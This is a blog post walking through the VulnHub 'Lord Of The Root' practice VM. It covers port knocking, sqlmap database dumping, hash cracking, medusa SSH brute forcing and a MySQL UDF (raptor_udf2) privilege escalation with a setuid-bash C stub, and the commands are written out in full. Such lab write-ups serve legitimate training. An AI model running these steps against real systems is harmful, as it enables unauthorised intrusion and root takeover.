<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Lord Of The Root: 1.0.1 write-up" /><meta property="og:locale" content="en" /><meta name="description" content="So this is the first write-up of lord of the root 1.0.1 created by this guy #KookSec." /><meta property="og:description" content="So this is the first write-up of lord of the root 1.0.1 created by this guy #KookSec." /><link rel="canonical" href="https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/" /><meta property="og:url" content="https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/" /><meta property="og:site_name" content="trickster0’s Nest" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2015-10-08T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lord Of The Root: 1.0.1 write-up" /><meta name="twitter:site" content="@trickster012" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2015-10-08T00:00:00+08:00","datePublished":"2015-10-08T00:00:00+08:00","description":"So this is the first write-up of lord of the root 1.0.1 created by this guy #KookSec.","headline":"Lord Of The Root: 1.0.1 write-up","mainEntityOfPage":{"@type":"WebPage","@id":"https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/"},"url":"https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/"}</script><title>Lord Of The Root: 1.0.1 write-up | trickster0's Nest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="trickster0's Nest"><meta name="application-name" content="trickster0's Nest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://www.clipartmax.com/png/middle/171-1712035_loki-chibi.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">trickster0's Nest</a></div><div class="site-subtitle font-italic">Pentester / Red Teamer / Malware Dev / Exploit Dev / Security Researcher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/trickster0" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/trickster012" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lord Of The Root: 1.0.1 write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lord Of The Root: 1.0.1 write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> trickster0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Oct 8, 2015, 12:00 AM +0800" >Oct 8, 2015<i class="unloaded">2015-10-08T00:00:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1594 words">8 min read</span></div></div><div class="post-content"><p>So this is the first write-up of lord of the root 1.0.1 created by this guy #KookSec.</p><p>This is apparently on the level of oscp certificate which i plan on taking so lets see…</p><p>After setting it up on vmware and running this lotr server we start up kali and begin the process…..</p><p>after a quick search of my LAN to find the target’s ip we find that the ip is 192.168.124.138 btw i am 192.168.124.134.</p><p>So lets start by scanning the target machine for open ports and stuff&gt;root@kali:~# nmap 192.168.124.138 -sT -p- -A Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:52 EDT Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 0.69% done Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 3.67% done; ETC: 18:55 (0:03:04 remaining) Nmap scan report for 192.168.124.138 (192.168.124.138) Host is up (0.0011s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA) | 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA) |_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA) MAC Address: 00:0C:29:8F:4B:CE (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3 OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 1.07 ms 192.168.124.138 (192.168.124.138)</p><p>We can see that the port 22(ssh) is on so lets try to connect and see what we can get from it</p><p><a href="https://trickster0.files.wordpress.com/2015/10/untitled.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/untitled.png" alt="Untitled" /></a></p><p>It says that it wants us to knock :P and it is easy as 1,2,3 so i am guessing i should knock on port 1,2,3</p><p>i used this script to knock</p><p>more</p><blockquote><p>#!/bin/sh HOST=$1 shift for ARG in “$@” ; do nmap -PN –host_timeout 201 –max-retries 0 -p $ARG $HOST done</p></blockquote><p>now lets run it</p><blockquote><p>root@kali:~/Desktop# ./knock.sh 192.168.124.138 1 2 3</p></blockquote><p>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT Warning: 192.168.124.138 giving up on port because retransmission cap hit (0). Nmap scan report for 192.168.124.138 (192.168.124.138) Host is up (0.00021s latency). PORT STATE SERVICE 1/tcp filtered tcpmux MAC Address: 00:0C:29:8F:4B:CE (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds</p><p>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT Warning: 192.168.124.138 giving up on port because retransmission cap hit (0). Nmap scan report for 192.168.124.138 (192.168.124.138) Host is up (0.00026s latency). PORT STATE SERVICE 2/tcp filtered compressnet MAC Address: 00:0C:29:8F:4B:CE (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds</p><p>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT Warning: 192.168.124.138 giving up on port because retransmission cap hit (0). Nmap scan report for 192.168.124.138 (192.168.124.138) Host is up (0.00027s latency). PORT STATE SERVICE 3/tcp filtered compressnet MAC Address: 00:0C:29:8F:4B:CE (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds</p><p>now lets scan once more to see if any new port has opened and a goodie server is running somewhere</p><blockquote><p>root@kali:~/Desktop# nmap 192.168.124.138 -sT -p- -A</p></blockquote><p>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 3.80% done; ETC: 19:00 (0:03:23 remaining) Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 7.43% done; ETC: 19:00 (0:02:42 remaining) Nmap scan report for 192.168.124.138 (192.168.124.138) Host is up (0.0015s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA) | 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA) |_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA) 1337/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn’t have a title (text/html). MAC Address: 00:0C:29:8F:4B:CE (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3 OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p>TRACEROUTE HOP RTT ADDRESS 1 1.49 ms 192.168.124.138 (192.168.124.138)</p><p>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 119.60 seconds</p><p>we can see that the leet(1337) port is open :P and there is an apache http server running so lets see the website</p><p><a href="https://trickster0.files.wordpress.com/2015/10/http.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/http.png" alt="http" /></a></p><p>so pretty much nothing on source code of the website either so lets test the robots.txt for any usefull info</p><p><a href="https://trickster0.files.wordpress.com/2015/10/robots.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/robots.png" alt="robots" /></a></p><p>we cant go from here??? well i can totally see something in the source page!!!!</p><blockquote><p>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</p></blockquote><p>and it looks like base64 so lets try to decode it and after decoding it we get this</p><blockquote><p>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</p></blockquote><p>i am guessing we are closer so lets decode the rest of this nonsense</p><blockquote><p>/978345210/index.php</p></blockquote><p>W8 WHAT???? a secret folder??? awesome :D lets try it</p><p><a href="https://trickster0.files.wordpress.com/2015/10/gates.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/gates.png" alt="gates" /></a></p><p>apparently we reached the gates of mordor which was much easier than the movie…</p><p>after testing a few sql queries i didnt have much success so i thought to fire up sqlmap and watch some magic happens with hopefully some of the parameters…</p><blockquote><p>root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms –dbs</p></blockquote><p>and we get the databases oh yeah!</p><p><a href="https://trickster0.files.wordpress.com/2015/10/gate.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/gate.png" alt="gate" /></a></p><p>now lets get the tables for the webapp db</p><blockquote><p>root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp –tables</p></blockquote><p>We can see a nice table called Users so lets see the columns of it :D</p><blockquote><p>root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp -T Users –columns</p></blockquote><p>so we saw some interesting columns but lets choose the best of them…lets get the dumps now :D</p><blockquote><p>root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp -T Users -C id,username,password –dump</p></blockquote><p><a href="https://trickster0.files.wordpress.com/2015/10/d.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/d.png" alt="d" /></a></p><p>but wait we havent finished yet!! we should check the mysql db too!!! running our sqlmap agains for the specifics tables and columns we get these dumps :D</p><blockquote><p>root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql –tables root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql -T User –columns root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql -T user -C User,Password –dump</p></blockquote><p><a href="https://trickster0.files.wordpress.com/2015/10/u.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/u.png" alt="u" /></a></p><p>checking the hash for debian didnt work out but it for the root one because after checking it on crackstation we got that the password for this hash is actually <strong>darkshadow</strong></p><p>after logging in with the credentials we got already on the gates of mordor i got trolled with this :/</p><p><a href="https://trickster0.files.wordpress.com/2015/10/lotr.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/lotr.png" alt="lotr" /></a></p><p>but after this i thought hey lets try to login on ssh so i crafted real quick a list of users and another list with passwords from the dumps we got and run my favourite medusa</p><blockquote><p>medusa -h 192.168.124.138 -U user -P pass -M ssh</p></blockquote><p><a href="https://trickster0.files.wordpress.com/2015/10/m.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/m.png" alt="m" /></a></p><p>OH YEAH! we got it lets connect on ssh now</p><p><a href="https://trickster0.files.wordpress.com/2015/10/p.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/p.png" alt="p" /></a></p><p>So now after checking around i noticed a folder called SECRET so i checked and saw 3 doors and by 3 doors i mean 3 folders name door1 door2 door3</p><p><a href="https://trickster0.files.wordpress.com/2015/10/a.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/a.png" alt="a" /></a> i checked and run all the file files on each door and they needed input not to add that they were running as root so i though buffer overflowing time so i checked to see if ASLR was on</p><blockquote><p>cat /proc/sys/kernel/randomize__va_space 2</p></blockquote><p>too bad :/ i tried some fuzzing anyway</p><p><a href="https://trickster0.files.wordpress.com/2015/10/seg.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/seg.png" alt="seg" /></a></p><p>BOOM SEGFAULT! after a while i tried inputting but it didnt work although it worked on another door so i figured someone is switching the damn files! ofc i copied the right one on the /tmp folder and checked it for a while but i wasnt feeling like doing buffer overflow so i remembered that i had a username=root and a password=darkshadow so i ran</p><blockquote><div class="table-wrapper"><table><tbody><tr><td>ps aux<td>grep mysql</table></div></blockquote><p>and it was running as root so…awesomeness since a while back i read an article about a method for privelege escalation through mysql! here it is –&gt; <a href="http://infamoussyn.com/page/3/">link</a> although there is already in kali something similar in this path /usr/share/sqlmap/udf/mysql/linux/32/lib_mysqludf_sys.so_ anyways, so i created a C script in the /tmp folder to give me 0 UID priv on bash so we can do some stuff i called it set.c</p><blockquote><p>cat set.c</p></blockquote><blockquote><p>#include #include #include int main(void) { setuid(0); setgid(0); system(“/bin/bash”) }</p></blockquote><p>and then i compiled it</p><blockquote><p>gcc set.c -o set chmod 755 set</p></blockquote><p>so we are ready and good to go after we will download the script raptor_udf2.c and follow the script’s commands</p><blockquote><p>gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</p></blockquote><p>there was a mistake in the code comments that we should use -w1 although it should be wl.. and so i logged in</p><blockquote><p>mysql -uroot -p</p></blockquote><blockquote><p>mysql&gt; use mysql; mysql&gt; create table foo(line blob); mysql&gt; insert into foo values(load_file(‘/home/raptor/raptor_udf2.so’)); mysql&gt; select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’; mysql&gt; create function do_system returns integer soname ‘raptor_udf2.so’; mysql&gt; select * from mysql.func; mysql&gt; select do_system(‘ls /root/ &gt; /tmp/set; chmod 777 /tmp/set’); mysql&gt; ! cat /tmp/out mysql&gt; select do_system(‘cat /root/Flag.txt &gt; /tmp/set; chmod 777 /tmp/set’); mysql&gt; ! cat /tmp/out</p></blockquote><p>after all that i managed to get this</p><p><a href="https://trickster0.files.wordpress.com/2015/10/pr.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/pr.png" alt="pr" /></a> BOOM WE GOT THE FLAG!!! but as u can see i saw some interesting files in the root directory!!!! so lets see the bonus!! first of all that damn switcher.py!!</p><p><a href="https://trickster0.files.wordpress.com/2015/10/sw.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/sw.png" alt="sw" /></a> there it is… lets see the buf.c and the other.c file</p><p><a href="https://trickster0.files.wordpress.com/2015/10/buf.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/buf.png" alt="buf" /></a> buf.c which was vulnerable cause hello…</p><blockquote><p>strcpy(buff, argv[1]);</p></blockquote><p><a href="https://trickster0.files.wordpress.com/2015/10/fine.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/10/fine.png" alt="fine" /></a> the other.c was fine…</p><p>so that is it thx a lot for this great challenge and for a good practise on my endless journey to hacking. thx a lot kooksec and thx vulnhub for hosting those great challenges they really teach us a lot!</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/challenges/" class="post-tag no-text-decoration" >challenges</a> <a href="/tags/hack/" class="post-tag no-text-decoration" >hack</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/kooksec/" class="post-tag no-text-decoration" >kooksec</a> <a href="/tags/lord-of-root/" class="post-tag no-text-decoration" >lord of root</a> <a href="/tags/lotr/" class="post-tag no-text-decoration" >lotr</a> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lord Of The Root: 1.0.1 write-up - trickster0's Nest&url=https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lord Of The Root: 1.0.1 write-up - trickster0's Nest&u=https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lord Of The Root: 1.0.1 write-up - trickster0's Nest&url=https://trickster0.github.io/posts/lord-of-the-root-1-0-1-write-up/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Primitive-Injection/">Primitive Injection - Breaking the Status Quo</a><li><a href="/posts/Custom-ReadMemory-API/">Custom ReadMemory API</a><li><a href="/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/">Halo's Gate Evolves -> Tartarus' Gate</a><li><a href="/posts/Solving-the-BFS-EkoParty/">Solving the BFS Ekoparty 2019 Exploitation Challenge</a><li><a href="/posts/earlybird-apc-queue-injection-with-processstatechange-a-twist/">EarlyBird APC Queue Injection With a ProcessStateChange Twist</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/vm/">vm</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/challenges/">challenges</a> <a class="post-tag" href="/tags/hack/">hack</a> <a class="post-tag" href="/tags/0/">%0</a> <a class="post-tag" href="/tags/asa/">asa</a> <a class="post-tag" href="/tags/certificate/">certificate</a> <a class="post-tag" href="/tags/cisco/">cisco</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/the-troller-trolled-the-tr0ll/"><div class="card-body"> <span class="timeago small" >Oct 11, 2015<i class="unloaded">2015-10-11T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The troller trolled the Tr0ll</h3><div class="text-muted small"><p> Hey everyone so this is the VM for the tr0ll server! i know it is kind of old but since i am trolling everyday in real life i thought i would try it so tr0ll2 is on the way too :D Let me add here ...</p></div></div></a></div><div class="card"> <a href="/posts/tr0ll2-the-revenge-of-the-tr0ll/"><div class="card-body"> <span class="timeago small" >Oct 24, 2015<i class="unloaded">2015-10-24T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tr0ll2: The Revenge Of The Tr0ll!!</h3><div class="text-muted small"><p> Hello everyone this is tr0ll 2 as i promised. Time to get some root access on the server, cause i didnt do much these days, so i will stop blabbing and start to explain what is going on and how eve...</p></div></div></a></div><div class="card"> <a href="/posts/pegasus-timbeeeeer-walkthrough/"><div class="card-body"> <span class="timeago small" >Nov 24, 2015<i class="unloaded">2015-11-24T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pegasus Timbeeeeer!!!! Walkthrough!</h3><div class="text-muted small"><p> Hello everyone this is pegasus VM walkthrough for practising and having fun :D greetings to everyone for creating this great challenge I started by running nmap to check all the services that pega...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/the-troller-trolled-the-tr0ll/" class="btn btn-outline-primary" prompt="Newer"><p>The troller trolled the Tr0ll</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/username">trickster0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/vm/">vm</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/challenges/">challenges</a> <a class="post-tag" href="/tags/hack/">hack</a> <a class="post-tag" href="/tags/0/">%0</a> <a class="post-tag" href="/tags/asa/">asa</a> <a class="post-tag" href="/tags/certificate/">certificate</a> <a class="post-tag" href="/tags/cisco/">cisco</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://trickster0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result 